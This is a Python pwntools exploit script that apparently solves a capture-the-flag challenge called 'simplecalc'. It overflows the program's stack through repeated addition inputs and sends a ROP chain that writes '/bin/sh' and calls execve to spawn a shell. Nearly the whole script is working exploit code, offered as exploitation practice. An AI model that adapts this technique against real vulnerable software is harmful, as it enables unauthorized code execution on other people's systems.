from pwn import *

target = process('./simplecalc')
#gdb.attach(target, gdbscript = 'b *0x40154a')

target.recvuntil(b'calculations: ')
target.sendline(b'100')

# Establish our rop gadgets
popRax = 0x44db34
popRdi = 0x401b73
popRsi = 0x401c87
popRdx = 0x437a85

# 0x000000000044526e : mov qword ptr [rax], rdx ; ret
movGadget = 0x44526e

syscall = 0x400488

# These two functions are what we will use to give input via addition
def addSingle(x):
  target.recvuntil(b"=> ")
  target.sendline(b"1")
  target.recvuntil(b"Integer x: ")
  target.sendline(b"100")
  target.recvuntil(b"Integer y: ")
  target.sendline(bytes(str(x - 100), encoding='utf-8'))


def add(z):
  x = z & 0xffffffff
  y = ((z & 0xffffffff00000000) >> 32)
  addSingle(x)
  addSingle(y)

# Fill up the space between the start of our input and the return address
for i in range(9):
  # Fill it up with null bytes, to make the ptr passed to free be a null pointer
  # So free doesn't crash
  add(0x0)

# Start writing th0e rop chain
'''
This is our ROP Chain

Write "/bin/sh" tp 0x6c1000

pop rax, 0x6c1000 ; ret
pop rdx, "/bin/sh\x00" ; ret
mov qword ptr [rax], rdx ; ret

# Move the needed values into the registers
pop rax, 0x3b ; ret
pop rdi, 0x6c1000 ; ret
pop rsi, 0x0 ; ret
pop rdx, 0x0 ; ret
'''
add(popRax)
add(0x6c1000)
add(popRdx)
add(0x0068732f6e69622f) # "/bin/sh" in hex
add(movGadget)

add(popRax) # Specify which syscall to make
add(0x3b)

add(popRdi) # Specify pointer to "/bin/sh"
add(0x6c1000)

add(popRsi) # Specify no arguments or environment variables
add(0x0)
add(popRdx)
add(0x0)

add(syscall) # Syscall instruction

target.sendline(b'5') # Save and exit to execute memcpy and trigger buffer overflow

# Drop to an interactive shell to use our new shell
target.interactive()
